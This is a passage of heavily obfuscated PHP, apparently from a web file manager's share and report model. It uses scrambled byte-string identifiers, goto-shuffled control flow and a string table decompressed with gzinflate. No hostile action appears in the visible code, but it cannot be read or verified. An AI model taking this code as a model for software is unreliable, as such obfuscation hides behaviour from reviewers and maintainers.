$f«ÍŸ‹Êç; goto f¤ŠÛñíª; f¤ŠÛñíª: } private function _shareAuthSet($B÷¿¥Õ¬ù, $Eğôåñ„º) { goto Eá¤¹‹Á±ƒ; aÚ‚ƒ«Ë´Î: $d×Èçñò->where(array($B¯’ìë§ë[441] => $B÷¿¥Õ¬ù))->delete(); $dª—ÕÔÖÇœ = array(); foreach ($Eğôåñ„º as $bê‘Î˜­) { $DÀÍ“ÂÄó¢ = SourceModel::TYPE_USER; if ($bê‘Î˜­[$B¯’ìë§ë[371]] == SourceModel::TYPE_GROUP) { $DÀÍ“ÂÄó¢ = SourceModel::TYPE_GROUP; } $CØ¶ˆ±‘ğ¼ = array($B¯’ìë§ë[441] => $B÷¿¥Õ¬ù, $B¯’ìë§ë[371] => $DÀÍ“ÂÄó¢, $B¯’ìë§ë[458] => intval($bê‘Î˜­[$B¯’ìë§ë[458]]), $B¯’ìë§ë[2256] => 0, $B¯’ìë§ë[2257] => -1); if ($bê‘Î˜­[$B¯’ìë§ë[2256]]) { $CØ¶ˆ±‘ğ¼[$B¯’ìë§ë[2256]] = $bê‘Î˜­[$B¯’ìë§ë[2256]]; } else { if ($bê‘Î˜­[$B¯’ìë§ë[2257]]) { $CØ¶ˆ±‘ğ¼[$B¯’ìë§ë[2257]] = $bê‘Î˜­[$B¯’ìë§ë[2257]]; } } $dª—ÕÔÖÇœ[] = $CØ¶ˆ±‘ğ¼; } goto fö‘ì’Å½½; fö‘ì’Å½½: return $d×Èçñò->addAll($dª—ÕÔÖÇœ, array(), !0); goto E·õŞÍÉ§Å; Eá¤¹‹Á±ƒ: $B¯’ìë§ë =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!is_array($Eğôåñ„º)) { return !1; } $d×Èçñò = Model($B¯’ìë§ë[2255]); goto aÚ‚ƒ«Ë´Î; E·õŞÍÉ§Å: } public function numViewAdd($cŠ¬»ãÔñ) { $e‚›‹¯åÀ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŠØô‚® = array($e‚›‹¯åÀ[440] => $cŠ¬»ãÔñ); $this->where($CŠØô‚®)->setAdd($e‚›‹¯åÀ[2252]); } public function numDownloadAdd($Aç–ñÙİæ) { $EéÓ°Ìó‰Û =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aåÕ©µœö® = array($EéÓ°Ìó‰Û[440] => $Aç–ñÙİæ); $this->where($aåÕ©µœö®)->setAdd($EéÓ°Ìó‰Û[2253]); } protected function shareEdit($Dõ¸ßİÏš, $a÷ˆ¨†ÁÙ) { goto Cö°Ö´Ç‹®; eƒ¤ñÓááè: $this->_checkLinkShare($a÷ˆ¨†ÁÙ, $FÄ´Ÿ¹¦ç¼); $CëÍŒÑÎË = array(); $f˜ğåˆŸ©Õ = explode($D–öñ®ó—¨[47], $D–öñ®ó—¨[2258]); goto aõŞÙº×°’; c¥–¥òùŸ: if (isset($a÷ˆ¨†ÁÙ[$D–öñ®ó—¨[2245]])) { $this->_shareAuthSet($Dõ¸ßİÏš, $a÷ˆ¨†ÁÙ[$D–öñ®ó—¨[2245]]); } return !0; goto f°¥„¥‡Š£; Cö°Ö´Ç‹®: $D–öñ®ó—¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÄ´Ÿ¹¦ç¼ = $this->getInfo($Dõ¸ßİÏš); if (!$FÄ´Ÿ¹¦ç¼) { return !1; } goto eƒ¤ñÓááè; aõŞÙº×°’: foreach ($f˜ğåˆŸ©Õ as $fƒõ¨ŠóÓ”) { if (!array_key_exists($fƒõ¨ŠóÓ”, $a÷ˆ¨†ÁÙ)) { continue; } $CëÍŒÑÎË[$fƒõ¨ŠóÓ”] = $a÷ˆ¨†ÁÙ[$fƒõ¨ŠóÓ”]; } $this->shareEventAdd($FÄ´Ÿ¹¦ç¼[$D–öñ®ó—¨[369]], $a÷ˆ¨†ÁÙ, $D–öñ®ó—¨[2079]); $this->where(array($D–öñ®ó—¨[440] => $Dõ¸ßİÏš))->save($CëÍŒÑÎË); goto c¥–¥òùŸ; f°¥„¥‡Š£: } private function _checkLinkShare($BËÃ¿ÏÉ±â, $DÖ˜×»„•œ) { goto Eòî ÚÔŒ; Eòî ÚÔŒ: $Bƒ—œ¹¢¨Å =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($BËÃ¿ÏÉ±â[$Bƒ—œ¹¢¨Å[446]] != $Bƒ—œ¹¢¨Å[83]) { return; } $fñ±ôË‰ßØ = $DÖ˜×»„•œ[$Bƒ—œ¹¢¨Å[391]][$Bƒ—œ¹¢¨Å[369]]; goto b“•¹Ì¬ï; bº´Ãø¾â: $A–¸´ï¶” = $this->shareFileMeta($E¯ùÀ™å÷ë[$Bƒ—œ¹¢¨Å[419]]); if (isset($A–¸´ï¶”[$Bƒ—œ¹¢¨Å[359]]) && $A–¸´ï¶”[$Bƒ—œ¹¢¨Å[359]] == $Bƒ—œ¹¢¨Å[83]) { show_json(LNG($Bƒ—œ¹¢¨Å[2261]), !1); } goto FŠ¾çÔ–‰; b“•¹Ì¬ï: if ($DÖ˜×»„•œ[$Bƒ—œ¹¢¨Å[391]][$Bƒ—œ¹¢¨Å[29]] != $Bƒ—œ¹¢¨Å[167]) { $d„¿ÒÂÛ¬ä = $this->_folderReport($fñ±ôË‰ßØ); if (!$d„¿ÒÂÛ¬ä) { return; } show_json(LNG($Bƒ—œ¹¢¨Å[2259]) . $Bƒ—œ¹¢¨Å[2260] . $d„¿ÒÂÛ¬ä, !1); } $E¯ùÀ™å÷ë = Model($Bƒ—œ¹¢¨Å[753])->fileInfoGet($DÖ˜×»„•œ[$Bƒ—œ¹¢¨Å[391]][$Bƒ—œ¹¢¨Å[369]]); if (!$E¯ùÀ™å÷ë) { return; } goto bº´Ãø¾â; FŠ¾çÔ–‰: } private function _folderReport($eÀİ¶Íë×Å) { goto eÆ‹½Ü©¦Í; eÆ‹½Ü©¦Í: $eœ›„ÎÇß‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dˆ¦Ç©¦ëÙ = array($eœ›„ÎÇß‹[419] => array($eœ›„ÎÇß‹[929], 0), $eœ›„ÎÇß‹[690] => 3); $a¯âéâ”ˆ = Model($eœ›„ÎÇß‹[2262])->where($dˆ¦Ç©¦ëÙ)->field($eœ›„ÎÇß‹[419])->select(); goto dŸº»¸æàÉ; bÏ”ñë¦¸¹: $dˆ¦Ç©¦ëÙ = array($eœ›„ÎÇß‹[419] => array($eœ›„ÎÇß‹[7], $a¯âéâ”ˆ), $eœ›„ÎÇß‹[461] => array($eœ›„ÎÇß‹[752], "\45{$Fà¯¬öÃ‰Š}\x25"), $eœ›„ÎÇß‹[397] => 0); $Eà‡â¾¡Â» = Model($eœ›„ÎÇß‹[753])->where($dˆ¦Ç©¦ëÙ)->field($eœ›„ÎÇß‹[2263])->find(); if (!$Eà‡â¾¡Â») { return !1; } goto cÎí†¯ÀĞß; C¿ö½™á“: $A…õÙòÍ‹ = array_to_keyvalue($a†µ‡¥†˜“, $eœ›„ÎÇß‹[33], $eœ›„ÎÇß‹[28]); $A…õÙòÍ‹[] = $Eà‡â¾¡Â»[$eœ›„ÎÇß‹[28]]; return implode($eœ›„ÎÇß‹[8], $A…õÙòÍ‹); goto EƒŠØ¢§É³; cÎí†¯ÀĞß: $f‹‰ÚÚ¢ = substr($Eà‡â¾¡Â»[$eœ›„ÎÇß‹[461]], strpos($Eà‡â¾¡Â»[$eœ›„ÎÇß‹[461]], $Fà¯¬öÃ‰Š)); $dˆ¦Ç©¦ëÙ = array($eœ›„ÎÇß‹[369] => array($eœ›„ÎÇß‹[7], trim($f‹‰ÚÚ¢, $eœ›„ÎÇß‹[47]))); $a†µ‡¥†˜“ = Model($eœ›„ÎÇß‹[753])->where($dˆ¦Ç©¦ëÙ)->field($eœ›„ÎÇß‹[28])->select(); goto C¿ö½™á“; dŸº»¸æàÉ: if (!$a¯âéâ”ˆ) { return !1; } $a¯âéâ”ˆ = array_to_keyvalue($a¯âéâ”ˆ, $eœ›„ÎÇß‹[33], $eœ›„ÎÇß‹[419]); $Fà¯¬öÃ‰Š = $eœ›„ÎÇß‹[47] . $eÀİ¶Íë×Å . $eœ›„ÎÇß‹[47]; goto bÏ”ñë¦¸¹; EƒŠØ¢§É³: } protected function remove($b­…çªÌ•í) { goto aÉÓè‘èŒ¸; b¡ ‰ò¢Ø : $fá§‰ƒË÷ = $this->where($aç¾ò•÷à…)->delete(); if ($fá§‰ƒË÷) { Model($A©®ÈöÉ‘¯[539])->where(array($A©®ÈöÉ‘¯[441] => $b­…çªÌ•í))->delete(); } $F‹†ïÆø¬ó = is_array($b­…çªÌ•í) ? $b­…çªÌ•í[1] : array($b­…çªÌ•í); goto EĞ—ˆ¥­ª; EĞ—ˆ¥­ª: for ($BÑŞåù¤ÈÏ = 0; $BÑŞåù¤ÈÏ < count($F‹†ïÆø¬ó); $BÑŞåù¤ÈÏ++) { $Aë½…­Üãø = $this->getInfo($F‹†ïÆø¬ó[$BÑŞåù¤ÈÏ]); if ($Aë½…­Üãø[$A©®ÈöÉ‘¯[448]] == $A©®ÈöÉ‘¯[83]) { Model($A©®ÈöÉ‘¯[507])->eventShare($Aë½…­Üãø[$A©®ÈöÉ‘¯[369]], $A©®ÈöÉ‘¯[2250]); } if ($Aë½…­Üãø[$A©®ÈöÉ‘¯[446]] == $A©®ÈöÉ‘¯[83]) { Model($A©®ÈöÉ‘¯[507])->eventShare($Aë½…­Üãø[$A©®ÈöÉ‘¯[369]], $A©®ÈöÉ‘¯[2249]); } } return $fá§‰ƒË÷; goto BßŠáéØÚİ; aÉÓè‘èŒ¸: $A©®ÈöÉ‘¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_array($b­…çªÌ•í)) { $b­…çªÌ•í = array($A©®ÈöÉ‘¯[7], $b­…çªÌ•í); } $aç¾ò•÷à… = array($A©®ÈöÉ‘¯[441] => $b­…çªÌ•í); goto b¡ ‰ò¢Ø ; BßŠáéØÚİ: } protected function removeBySource($b²ì†×ø¶) { goto eŸ¿¨ÚÕÛ†; eŸ¿¨ÚÕÛ†: $AõùÓî‡Òã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e±ëî†Êƒ = array($AõùÓî‡Òã[383] => array($AõùÓî‡Òã[384], $b²ì†×ø¶)); $CÛŞŞÇ‘¥ñ = $this->field($AõùÓî‡Òã[441])->where($e±ëî†Êƒ)->select(); goto FÉ–«‹§‚; FÉ–«‹§‚: $CÛŞŞÇ‘¥ñ = array_to_keyvalue($CÛŞŞÇ‘¥ñ, $AõùÓî‡Òã[33], $AõùÓî‡Òã[441]); if (!$CÛŞŞÇ‘¥ñ) { return; } $e±ëî†Êƒ = array($AõùÓî‡Òã[440] => array($AõùÓî‡Òã[384], $CÛŞŞÇ‘¥ñ)); goto fõéÜ  Ô; fõéÜ  Ô: $this->where($e±ëî†Êƒ)->delete(); Model($AõùÓî‡Òã[539])->where($e±ëî†Êƒ)->delete(); goto fé‡¢¡ƒí™; fé‡¢¡ƒí™: } public function listAll($AÆÄ¾†›‡§) { goto B‡ºÅå§ÎË; B‡ºÅå§ÎË: $dÕöÍî“² =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fˆ³—›ˆ = array(); if ($AÆÄ¾†›‡§[$dÕöÍî“²[1441]]) { $Fˆ³—›ˆ[$dÕöÍî“²[1441]] = $AÆÄ¾†›‡§[$dÕöÍî“²[1441]]; } goto dˆÈØßËä£; dˆÈØßËä£: if ($AÆÄ¾†›‡§[$dÕöÍî“²[703]]) { $A³¿Û™‘¥Û = $AÆÄ¾†›‡§[$dÕöÍî“²[449]] ? $AÆÄ¾†›‡§[$dÕöÍî“²[449]] : strtotime(date($dÕöÍî“²[2264])); $Fˆ³—›ˆ[$dÕöÍî“²[187]] = array($dÕöÍî“²[321], array($AÆÄ¾†›‡§[$dÕöÍî“²[703]], $A³¿Û™‘¥Û)); } if ($AÆÄ¾†›‡§[$dÕöÍî“²[29]]) { $Fˆ³—›ˆ[$AÆÄ¾†›‡§[$dÕöÍî“²[29]]] = 1; } else { $Fˆ³—›ˆ[] = array($dÕöÍî“²[446] => array($dÕöÍî“²[929], 0), $dÕöÍî“²[448] => array($dÕöÍî“²[929], 0), $dÕöÍî“²[2240] => $dÕöÍî“²[2197]); } if ($AÆÄ¾†›‡§[$dÕöÍî“²[2193]]) { $Fˆ³—›ˆ[] = array($dÕöÍî“²[443] => $AÆÄ¾†›‡§[$dÕöÍî“²[2193]], $dÕöÍî“²[1347] => array($dÕöÍî“²[752], "\x25{$AÆÄ¾†›‡§[$dÕöÍî“²[2193]]}\x25"), $dÕöÍî“²[2240] => $dÕöÍî“²[2197]); } goto E†°‰ã¬„; E†°‰ã¬„: $DµÏ½¨¶ºÓ = $this->_makeOrder()->where($Fˆ³—›ˆ)->selectPage(20); if (empty($DµÏ½¨¶ºÓ[$dÕöÍî“²[354]])) { return array(); } $this->_listDataApply($DµÏ½¨¶ºÓ[$dÕöÍî“²[354]]); goto A¹ˆƒÄä´†; A¹ˆƒÄä´†: return $DµÏ½¨¶ºÓ; goto A¹£ƒÅ¢; A¹£ƒÅ¢: } public function listDataApply($DŒæ…–ïù) { $this->_listDataApply($DŒæ…–ïù); return $DŒæ…–ïù; } private function _listDataApply(&$E™¾ª¹”Ş) { $EÒê£ëÁæ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÏßùŒöº£ = array_to_keyvalue($E™¾ª¹”Ş, $EÒê£ëÁæ[33], $EÒê£ëÁæ[1441]); $e³‹¢ƒ„ùğ = Model($EÒê£ëÁæ[479])->userListInfo(array_unique($AÏßùŒöº£)); $F˜½§Ïç® = array_to_keyvalue($E™¾ª¹”Ş, $EÒê£ëÁæ[33], $EÒê£ëÁæ[369]); $d†êŸè“Äô = Model($EÒê£ëÁæ[753])->sourceListInfo($F˜½§Ïç®, !0); foreach ($E™¾ª¹”Ş as &$Açêã’¸´) { $Fß˜…‚½’Ş = $Açêã’¸´[$EÒê£ëÁæ[1441]]; $Açêã’¸´[$EÒê£ëÁæ[2265]] = $e³‹¢ƒ„ùğ[$Fß˜…‚½’Ş] ? $e³‹¢ƒ„ùğ[$Fß˜…‚½’Ş] : !1; $C†„øÚ…‡ñ = $Açêã’¸´[$EÒê£ëÁæ[369]]; $Açêã’¸´[$EÒê£ëÁæ[391]] = $d†êŸè“Äô[$C†„øÚ…‡ñ] ? $d†êŸè“Äô[$C†„øÚ…‡ñ] : !1; } } private function _makeOrder($cÔ¶Ñö‚» = '') { goto E»À£ÄÂ›; E­¹Âƒ™‡: $cÔ¶Ñö‚» = $cÔ¶Ñö‚» . "{$aåÔ¡Äá‡Ş}\x20{$AÖôÎ¥´êë}"; return $this->order($cÔ¶Ñö‚»); goto dÃ¢É†ÄÈ; Aª¤Œ°Ò¦: $aåÔ¡Äá‡Ş = Input::get($E«®íÉí‚Â[407], $E«®íÉí‚Â[7], $E«®íÉí‚Â[389], $e†İå¶ìÍ); $AÖôÎ¥´êë = Input::get($E«®íÉí‚Â[408], $E«®íÉí‚Â[7], $E«®íÉí‚Â[2266], array($E«®íÉí‚Â[2192], $E«®íÉí‚Â[404])); $AÖôÎ¥´êë = $B„¸ò”Ã[$AÖôÎ¥´êë]; goto E­¹Âƒ™‡; E»À£ÄÂ›: $E«®íÉí‚Â =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e†İå¶ìÍ = array($E«®íÉí‚Â[187], $E«®íÉí‚Â[449], $E«®íÉí‚Â[2252], $E«®íÉí‚Â[2253]); $B„¸ò”Ã = array($E«®íÉí‚Â[402] => $E«®íÉí‚Â[403], $E«®íÉí‚Â[404] => $E«®íÉí‚Â[405]); goto Aª¤Œ°Ò¦; dÃ¢É†ÄÈ: } public function reportAdd($e¢š‘ªÓ¥Š) { $AšŸ®×“é =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D‹Ôá‡ºö† = array($AšŸ®×“é[441] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[441]], $AšŸ®×“é[1441] => USER_ID); if (Model($AšŸ®×“é[2262])->where($D‹Ôá‡ºö†)->find()) { return !1; } $C›Ãé¯¬…¿ = array($AšŸ®×“é[441] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[441]], $AšŸ®×“é[1347] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[1347]], $AšŸ®×“é[369] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[369]], $AšŸ®×“é[419] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[419]], $AšŸ®×“é[1441] => USER_ID, $AšŸ®×“é[29] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[29]], $AšŸ®×“é[405] => $e¢š‘ªÓ¥Š[$AšŸ®×“é[405]]); return Model($AšŸ®×“é[2262])->add($C›Ãé¯¬…¿); } public function reportList($BÖ‚Ÿ±»ÎÖ) { goto F‹©×›Çôï; F‹©×›Çôï: $cô‘·¼·×Ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FôœÒ‘çÇ = array(); if ($BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[703]]) { $f¶åÖÜî‰° = $BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[449]] ? $BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[449]] : strtotime(date($cô‘·¼·×Ê[2264])); $FôœÒ‘çÇ[$cô‘·¼·×Ê[187]] = array($cô‘·¼·×Ê[321], array($BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[703]], $f¶åÖÜî‰°)); } goto EÄ´ŠÓˆ; Añï‚èğ¸: if (empty($c»¨²İøÅ›[$cô‘·¼·×Ê[354]])) { return array(); } $this->_listDataApply($c»¨²İøÅ›[$cô‘·¼·×Ê[354]]); return $c»¨²İøÅ›; goto fˆ˜£·ù §; F–×ÛÏ³§–: $c÷‰ª¿…± = array($cô‘·¼·×Ê[402] => $cô‘·¼·×Ê[403], $cô‘·¼·×Ê[404] => $cô‘·¼·×Ê[405]); $CíÇîÀ”Ô› = $cô‘·¼·×Ê[2270] . $c÷‰ª¿…±[$f‰ŠÙƒ¢]; $c»¨²İøÅ› = Model($cô‘·¼·×Ê[2262])->where($FôœÒ‘çÇ)->order($CíÇîÀ”Ô›)->selectPage(20); goto Añï‚èğ¸; EÄ´ŠÓˆ: if (isset($BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[29]]) && in_array($BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[29]], array($cô‘·¼·×Ê[83], $cô‘·¼·×Ê[2267], $cô‘·¼·×Ê[2268], $cô‘·¼·×Ê[2269], $cô‘·¼·×Ê[1927]))) { $FôœÒ‘çÇ[$cô‘·¼·×Ê[29]] = $BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[29]]; } if (isset($BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[690]]) && in_array($BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[690]], array($cô‘·¼·×Ê[470], $cô‘·¼·×Ê[83], $cô‘·¼·×Ê[2267], $cô‘·¼·×Ê[2268]))) { $FôœÒ‘çÇ[$cô‘·¼·×Ê[690]] = $BÖ‚Ÿ±»ÎÖ[$cô‘·¼·×Ê[690]]; } $f‰ŠÙƒ¢ = Input::get($cô‘·¼·×Ê[408], $cô‘·¼·×Ê[7], $cô‘·¼·×Ê[2266], array($cô‘·¼·×Ê[2192], $cô‘·¼·×Ê[404])); goto F–×ÛÏ³§–; fˆ˜£·ù §: } public function reportStatus($F¬‹’‹øæ) { goto Cã›ë£¶Œğ; B˜ê¦œÓ•Ì: return $aó¨…‹¼å; goto e™ñÈí¬˜¢; C™»ùŸŞÊ: $aó¨…‹¼å = Model($cõñ³¦ö‡Æ[2262])->where($F÷ß“¦ŸÀ)->save($A¨«ï“ò‡÷); if ($F¬‹’‹øæ[$cõñ³¦ö‡Æ[690]] == $cõñ³¦ö‡Æ[2267]) { if ($E¤…ĞÌ«°[$cõñ³¦ö‡Æ[419]] != $cõñ³¦ö‡Æ[470] && $this->shareFileMeta($E¤…ĞÌ«°[$cõñ³¦ö‡Æ[419]])) { $this->shareFileMeta($E¤…ĞÌ«°[$cõñ³¦ö‡Æ[419]], 0); } $this->remove($E¤…ĞÌ«°[$cõñ³¦ö‡Æ[441]]); return !0; } if ($aó¨…‹¼å && $F¬‹’‹øæ[$cõñ³¦ö‡Æ[690]] == $cõñ³¦ö‡Æ[2268]) { $CØ†¥˜ùÚ = $A¨«ï“ò‡÷[$cõñ³¦ö‡Æ[690]] == $cõñ³¦ö‡Æ[2268] ? 1 : 0; $this->shareFileMeta($E¤…ĞÌ«°[$cõñ³¦ö‡Æ[419]], $CØ†¥˜ùÚ); $this->removeByFile($E¤…ĞÌ«°[$cõñ³¦ö‡Æ[419]]); } goto B˜ê¦œÓ•Ì; c¹Ç…ÓŞÃ°: if (!$E¤…ĞÌ«°) { return !1; } $A¨«ï“ò‡÷ = array($cõñ³¦ö‡Æ[690] => $F¬‹’‹øæ[$cõñ³¦ö‡Æ[690]]); if ($F¬‹’‹øæ[$cõñ³¦ö‡Æ[690]] == $cõñ³¦ö‡Æ[2268] && $E¤…ĞÌ«°[$cõñ³¦ö‡Æ[690]] == $cõñ³¦ö‡Æ[2268]) { $A¨«ï“ò‡÷[$cõñ³¦ö‡Æ[690]] = 0; } goto C™»ùŸŞÊ; Cã›ë£¶Œğ: $cõñ³¦ö‡Æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F÷ß“¦ŸÀ = array($cõñ³¦ö‡Æ[367] => $F¬‹’‹øæ[$cõñ³¦ö‡Æ[367]]); $E¤…ĞÌ«° = Model($cõñ³¦ö‡Æ[2262])->where($F÷ß“¦ŸÀ)->field($cõñ³¦ö‡Æ[2271])->find(); goto c¹Ç…ÓŞÃ°; e™ñÈí¬˜¢: } private function removeByFile($C•¼ƒ±Ìõ„) { goto E¸¹Îæ¾¬Ú; E¸¹Îæ¾¬Ú: $eéˆ‡¡¥à =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÍÎÊ†©­à = Model($eéˆ‡¡¥à[753])->where(array($eéˆ‡¡¥à[419] => $C•¼ƒ±Ìõ„))->field($eéˆ‡¡¥à[369])->select(); $Bƒî×ñÁàÅ = array_to_keyvalue($bÍÎÊ†©­à, $eéˆ‡¡¥à[33], $eéˆ‡¡¥à[369]); goto dÚì»„Çßœ; dÚì»„Çßœ: $d…×ÕëñÔ‚ = array($eéˆ‡¡¥à[369] => array($eéˆ‡¡¥à[7], $Bƒî×ñÁàÅ), $eéˆ‡¡¥à[446] => 1); $bÍÎÊ†©­à = Model($eéˆ‡¡¥à[2089])->where($d…×ÕëñÔ‚)->field($eéˆ‡¡¥à[441])->select(); if (empty($bÍÎÊ†©­à)) { return; } goto EÚÉ™¨ÉÀ«; EÚÉ™¨ÉÀ«: $D¤ªŒå»‚Î = array_to_keyvalue($bÍÎÊ†©­à, $eéˆ‡¡¥à[33], $eéˆ‡¡¥à[441]); $this->remove($D¤ªŒå»‚Î); goto A„…¶è³í; A„…¶è³í: } private function shareFileMeta($DÎ¹áŞøØ¢, $c¨Ç“Ç†Ïî = null) { $FÒ †ÙÌ‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F§½„ÂÑÍ— = array($FÒ †ÙÌ‘[419] => $DÎ¹áŞøØ¢, $FÒ †ÙÌ‘[89] => $FÒ †ÙÌ‘[2272]); if (is_null($c¨Ç“Ç†Ïî)) { return Model($FÒ †ÙÌ‘[2273])->where($F§½„ÂÑÍ—)->find(); } $F§½„ÂÑÍ—[$FÒ †ÙÌ‘[359]] = $c¨Ç“Ç†Ïî; Model($FÒ †ÙÌ‘[2273])->add($F§½„ÂÑÍ—, array(), !0); } } goto A¶è§ÒÇÃ‚; B‡‹ÉË”¦ª: $_SERVER[$_SERVER[ïÚûó†Îá][49]] = ("\x39\x38\x30\x37"."\x30\x36")+0;$_ngN7="4KXr5kgBK3rZGZeqRZgJqWjN5hvVprmXbUt6Dq4QQueHUT7ntaPXhSsuCFKx6W2AjeYe4F8RmfiD";; stream_wrapper_register($_SERVER[ïÚûó†Îá][50], $_SERVER[ïÚûó†Îá][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($C¤Û¾¸ëŸ, $F²»¡Œ‹—õ) { $FˆÆ«ˆˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset(self::$_methodList[$C¤Û¾¸ëŸ])) { return @call_user_func_array(self::$_methodList[$C¤Û¾¸ëŸ], $F²»¡Œ‹—õ); } else { if (method_exists($this, $C¤Û¾¸ëŸ)) { return call_user_func_array(array($this, $C¤Û¾¸ëŸ), $F²»¡Œ‹—õ); } else { think_exception(__CLASS__ . $FˆÆ«ˆˆ[4] . $C¤Û¾¸ëŸ . $FˆÆ«ˆˆ[5]); } } } public static function __callStatic($A«¤Ûš», $Cò›òÆËÊ…) { if (isset(self::$_methodListStatic[$A«¤Ûš»])) { return call_user_func_array(self::$_methodListStatic[$A«¤Ûš»], $Cò›òÆËÊ…); } else { if (method_exists(self, $A«¤Ûš»)) { return call_user_func_array(array(self, $A«¤Ûš»), $Cò›òÆËÊ…); } else { show_json("{$A«¤Ûš»}\x28\51\40\x6e\157\x74\x20\145\170\151\163\x74\x3b", !1); } } } public static function addMethod($Eˆ¿áäæá, $Eõ¼õ¬Ú) { self::$_methodList[$Eˆ¿áäæá] = $Eõ¼õ¬Ú; } public static function addMethodStatic($B¾à³ùŸ‘…, $E ‹Î¯ÜÁŞ) { self::$_methodListStatic[$B¾à³ùŸ‘…] = $E ‹Î¯ÜÁŞ; } } goto e½Ááô„©š; B¨èá‡Œğ›: $fÖŒ®ñ¯·ï = $_SERVER[´Ù×Íå‘ÄõÛ][549]; while ($fÖŒ®ñ¯·ï < $_SERVER[´Ù×Íå‘ÄõÛ][550]) { if ($fÖŒ®ñ¯·ï >= 0) { break; } $fÖŒ®ñ¯·ï++; } $_SERVER[¦“®å”‹ôÍ] = explode($_SERVER[´Ù×Íå‘ÄõÛ][551], gzinflate(substr($_SERVER[´Ù×Íå‘ÄõÛ][552], 10, -8))); goto AèÅ´å²î­; F¥îâÄ„ö: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\x52\145\143\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\x72\106\151\154\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\162\x46\x69\154\145\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\160\122\x6f\x6f\x74\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\x72\x53\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\123\x68\141\x72\145\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\124\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\145\x49\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\145\111\164\x65\x6d\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\x6b\175"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\x52\145\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\x65\162\175"; public static function typeList() { $bîÅÍ×¸­» =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($bîÅÍ×¸­»[1054] => self::KOD_SOURCE, $bîÅÍ×¸­»[1055] => self::KOD_USER_RECYCLE, $bîÅÍ×¸­»[1056] => self::KOD_USER_FAV, $bîÅÍ×¸­»[1057] => self::KOD_USER_FILE_TAG, $bîÅÍ×¸­»[1058] => self::KOD_USER_FILE_TYPE, $bîÅÍ×¸­»[1059] => self::KOD_GROUP_ROOT_SELF, $bîÅÍ×¸­»[1060] => self::KOD_USER_SHARE, $bîÅÍ×¸­»[1061] => self::KOD_USER_SHARE_LINK, $bîÅÍ×¸­»[1062] => self::KOD_USER_SHARE_TO_ME, $bîÅÍ×¸­»[1063] => self::KOD_SHARE_ITEM, $bîÅÍ×¸­»[1064] => self::KOD_SHARE_LINK, $bîÅÍ×¸­»[1065] => self::KOD_SEARCH, $bîÅÍ×¸­»[1066] => self::KOD_BLOCK, $bîÅÍ×¸­»[1067] => self::KOD_IO, $bîÅÍ×¸­»[1068] => self::KOD_USER_RECENT, $bîÅÍ×¸­»[1069] => self::KOD_USER_DRIVER); } public static function parse($a×‰½ó·®Ü) { goto dŸÉ¡¦‹™©; BÜÂ²Ñ‹¢“: $aµ¹“îŠÛÓ = array($a¢¤ïœé“‘[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $AËô«„ùåÀ[$a¢¤ïœé“‘[1074]] = in_array($AËô«„ùåÀ[$a¢¤ïœé“‘[29]], $aµ¹“îŠÛÓ); return $AËô«„ùåÀ; goto a‹ß³àéñù; dŸÉ¡¦‹™©: $a¢¤ïœé“‘ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a×‰½ó·®Ü = self::clear($a×‰½ó·®Ü); $B¼„Àà´‡¨ = array_values(self::typeList()); goto d†Ù¥‰¼šÒ; d†Ù¥‰¼šÒ: preg_match($a¢¤ïœé“‘[1070], $a×‰½ó·®Ü, 